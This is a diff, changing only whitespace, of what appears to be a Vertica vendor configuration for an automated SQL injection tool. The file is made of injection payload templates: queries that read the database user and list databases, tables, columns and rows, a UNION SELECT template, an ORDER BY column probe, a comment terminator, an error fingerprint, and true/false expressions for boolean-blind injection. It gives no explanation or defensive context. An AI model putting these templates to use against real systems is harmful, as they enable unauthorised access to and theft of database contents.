@@ -1,6 +1,6 @@
 vendor: Vertica
 
-resource: 
+resource:
  info: |
   select
       '${enclose_value_sql}'
@@ -10,10 +10,10 @@ resource:
       || '${enclose_value_sql}'
       || user
       || '${trail_sql}'
-      
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        rr
        ||'${trail_sql}'
        r
@@ -29,9 +29,9 @@ resource:
        order by rr
        ${limit}
    )x
-   
+
   table: |
-   select 
+   select
        rr
        ||'${trail_sql}'
        r
@@ -48,9 +48,9 @@ resource:
        order by rr
        ${limit}
    )x
-   
+
   column: |
-   select 
+   select
        rr
        ||'${trail_sql}'
        r
@@ -68,10 +68,10 @@ resource:
        order by rr
        ${limit}
    )x
-   
-  row: 
+
+  row:
    query: |
-    select 
+    select
         rr
         ||'${trail_sql}'
         r
@@ -87,7 +87,7 @@ resource:
         order by rr
         ${limit}
     )x
-   fields: 
+   fields:
     field: |
      trim(
          coalesce(
@@ -96,9 +96,9 @@ resource:
          )
      )
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    select
        /**
@@ -118,25 +118,25 @@ strategy:
   calibrator: repeat(chr(35), 1024)
   limitBoundary: 0
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - Vertica Analytics
-    
- normal: 
+
+ normal:
   indices: union select ${indices}
   capacity: (select '${lead}' || ${indice} || ${calibrator})
   orderBy: order by 1337
-  
- boolean: 
-  test: 
-   falses: 
+
+ boolean:
+  test:
+   falses:
     - true = false
     - true %21= true
     - false %21= false
     - 1 = 2
     - 1 %21= 1
     - 2 %21= 2
-   trues: 
+   trues:
     - true = true
     - false = false
     - true %21= false
